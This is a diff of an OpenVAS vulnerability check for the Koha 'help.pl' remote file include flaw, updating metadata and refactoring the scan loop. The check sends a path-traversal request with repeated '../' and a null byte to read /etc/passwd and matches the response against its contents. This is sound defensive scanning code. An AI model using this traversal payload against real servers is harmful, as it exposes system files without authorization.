@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_liblime_koha_51004.nasl 3117 2016-04-19 10:19:37Z benallard $
+# $Id: gb_liblime_koha_51004.nasl 5749 2017-03-28 13:47:32Z cfi $
 #
 # Koha 'help.pl' Remote File Include Vulnerability
 #
@@ -33,12 +33,11 @@ sensitive information or execute arbitrary script code in the context
 of the webserver process. This may allow the attacker to compromise
 the application and the computer; other attacks are also possible.";
 
-
-if (description)
+if(description)
 {
  script_id(103361);
  script_bugtraq_id(51004);
- script_version ("$Revision: 3117 $");
+ script_version ("$Revision: 5749 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Koha 'help.pl' Remote File Include Vulnerability");
@@ -47,10 +46,9 @@ if (description)
  script_xref(name : "URL" , value : "http://koha-community.org/");
  script_xref(name : "URL" , value : "http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=6628");
 
- script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:19:37 +0200 (Tue, 19 Apr 2016) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-28 15:47:32 +0200 (Tue, 28 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-12-12 10:49:53 +0100 (Mon, 12 Dec 2011)");
  script_tag(name:"qod_type", value:"remote_vul");
- script_summary("Determine if installed Koha is vulnerable");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
@@ -64,23 +62,19 @@ if (description)
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 
-dirs = make_list(cgi_dirs());
+foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
-   
-  url = string(dir, "/koha/help.pl?url=koha/",crap(data:"../",length:9*9),"etc/passwd%00.pl"); 
+  if( dir == "/" ) dir = "";
+  url = string(dir, "/koha/help.pl?url=koha/",crap(data:"../",length:9*9),"etc/passwd%00.pl");
 
   if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {
-     
-    security_message(port:port);
-    exit(0);
-
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
   }
 }
 
-exit(0);
+exit( 99 );
